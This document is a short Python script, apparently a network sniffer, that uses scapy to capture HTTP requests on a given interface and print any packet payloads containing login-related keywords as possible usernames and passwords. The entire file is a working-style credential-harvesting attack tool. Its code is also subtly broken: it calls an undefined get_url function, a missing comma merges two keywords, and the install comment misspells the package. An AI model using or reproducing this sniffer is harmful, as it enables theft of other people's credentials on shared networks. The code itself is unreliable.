import argparse
import scapy.all as scapy
from scapy_http import http
#pip install scappy_http

def get_argumets():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i", "--interface", dest="interface", help="Interface Name")

    options = parse.parse_args()
    return options

def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "password", "user", "username", "pass", "usuario"
                    "senha", "contrasena", "logon", "acess"]
        for keywords in keywords:
            if keywords in load:
                return load
            
def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url)
        credentials = get_credentials(packet)
        if credentials:
            print("[+] Possible password/username " + credentials + "\n\n")

options = get_argumets()
sniff_packet(options.interface)
